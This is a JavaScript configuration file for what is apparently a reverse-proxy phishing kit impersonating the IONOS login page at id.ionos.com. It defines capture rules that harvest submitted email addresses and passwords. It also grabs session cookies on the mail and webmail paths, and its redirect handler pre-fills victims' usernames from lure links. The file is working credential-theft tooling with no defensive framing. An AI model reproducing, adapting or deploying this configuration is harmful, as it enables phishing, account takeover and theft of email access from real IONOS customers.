/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const fs = require('fs')
const superagent = require('superagent');


// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientContext) {

        if (this.req.url.startsWith('/?qrc')) {

            const replacedUrl = decodeURIComponent(this.req.url.replace('qrc', 'username'))

            this.res.writeHead(302, {location: replacedUrl})
            return this.res.end()
        }
        return super.execute(clientContext)

    }
}
/** Important Defaults */

const configExport = {
    SCHEME: 'ionos',

    CURRENT_DOMAIN: 'id.ionos.com',

    AUTOGRAB_CODE: 'username',


    START_PATH: '/',

    COOKIE_PATH: ['/home', '/mail', '/webmail'],

    EXIT_TRIGGER_PATH: [],

    EXIT_URL: 'https://ionos.com',


    EXTERNAL_FILTERS:[],

    EXTRA_COMMANDS: [

        {
            path: '/identifier',
            command: 'DONOT_SEND_INFO',
            command_args: {},
        },

    ],


    PRE_HANDLERS:[],
   
    PROXY_REQUEST: 'DEFAULT',
    PROXY_RESPONSE: 'DEFAULT',
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        ionosEmail: {
            method: 'POST',
            params: ['identifier'],
            urls: '',
            hosts: ['id.ionos.com']
        },
        ionosPassword: {
            method: 'POST',
            params: ['password'],
            urls: '',
            hosts: ['id.ionos.com']
        },
       
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport

